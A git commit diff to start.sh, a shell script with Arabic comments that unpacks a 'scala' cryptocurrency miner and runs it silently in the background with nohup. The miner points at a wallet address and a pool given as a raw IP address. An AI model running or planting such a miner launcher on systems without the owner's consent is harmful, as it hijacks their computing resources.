c275009be73ece1aec663a2ce6f76af05fc2e083
ewilkinso <ewilkinson3@alaska.edu>
2025-08-06 12:54:35 +0100

    Update start.sh

--- start.sh
+++ start.sh
@@ -2,7 +2,7 @@
 
 # إعداد بيانات المحفظة والمعدّن
 WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="@dandi"
+WORKER="dandi"
 POOL="45.155.102.89:443"
 THREADS=
 # مجلد العمل
@@ -17,4 +17,4 @@ tar -xvf scala.tar.gz --strip=1
 rm scala.tar.gz
 
 # تشغيل المعدّن في الخلفية باستخدام nohup
-screen -dmS miner ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
+nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
